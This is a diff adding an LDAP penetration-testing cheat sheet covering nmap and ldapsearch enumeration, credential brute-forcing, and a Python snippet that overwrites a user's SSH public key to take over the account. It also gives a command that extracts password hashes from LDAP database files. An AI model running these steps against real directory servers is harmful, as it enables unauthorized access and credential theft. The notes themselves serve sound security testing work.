@@ -1,0 +1,81 @@
+# Pentesting LDAP
+# Default port: 389 and 636(ldaps). Global Catalog (LDAP in
+# ActiveDirectory) is available by default on ports 3268, and 3269 for LDAPS.
+
+# Enumeration (nmap)
+
+## Get Root DSE (LDAP server capabilities)
+ldap-rootdse.nse : Retrieves the LDAP root DSA-specific Entry (DSE)
+nmap -p 389 --script ldap-rootdse <host>
+
+## Get all public information
+nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials
+
+
+## Perform LDAP search queries
+ldap-search.nse : Attempts to perform an LDAP search and returns all matches.
+;; If no username and password is supplied to the script the Nmap registry
+;; is consulted. If the ldap-brute script has been selected and it found
+;; a valid account, this account will be used. If not anonymous bind will
+;; be used as a last attempt.
+
+nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,ldap.qfilter=users,ldap.attrib=sAMAccountName' <host>
+
+nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,ldap.qfilter=custom,ldap.searchattrib="operatingSystem",ldap.searchvalue="Windows *Server*",ldap.attrib={operatingSystem,whencreated,OperatingSystemServicePack}' <host>
+
+## Enumeration (ldapsearch)
+;; checkout additional ldapsearch cheatsheet
+
+### Get domain name
+ldapsearch -h <IP> -p 389 -x -s base -b '' "(objectClass=*)" "*" +
+
+### Get users
+;; Once you are aware of the base name in the above example
+;; 'example.com' we can query for ldap users etc. by:
+ldapsearch -h 10.10.xx.xx -p 389 -x -b "dc=example,dc=com"
+
+## Enumeration (jxplorer)
+;; a cool enumeration GUI tool is jxplorer
+Remember to authenticate providing username/password in this format:
+Level: User+Password
+DN: DOMAINNAME\Username
+password: (as usual)
+
+## Bruteforce credentials
+
+ldap-brute.nse : Attempts to brute-force LDAP authentication. By default
+;; it uses the built-in username and password lists. In order to use your own
+;; lists use the userdb and passdb script arguments. This script does not
+;; make any attempt to prevent account lockout! If the number of passwords
+;; in the dictionary exceeds the amount of allowed tries, accounts will be
+;; locked out. This usually happens very quickly.
+
+
+
+!! Check out also ldapsearch and jxplorer
+
+
+## Rewrite LDAP Fields
+
+Note that if you can modify values you could be able to perform really
+interesting actions. For example, imagine that you can change the
+"sshPublicKey" information of your user or any user. It's highly probable
+that if this attribute exist, then ssh is reading the public keys from
+LDAP. If you can modify the public key of a user you will be able to
+login as that user even if password authentication is not enabled in ssh.
+    >>> import ldap3
+    >>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)
+    >>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)
+    >>> connection.bind()
+    True
+    >>> connection.extend.standard.who_am_i()
+    u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'
+    >>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'])]})
+
+Example taken from: https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
+
+## Post Exploitation Credentials
+;; If you can access the files where the databases are contained (could be in /var/lib/ldap).
+;; You can extract the hashes using:
+cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
+
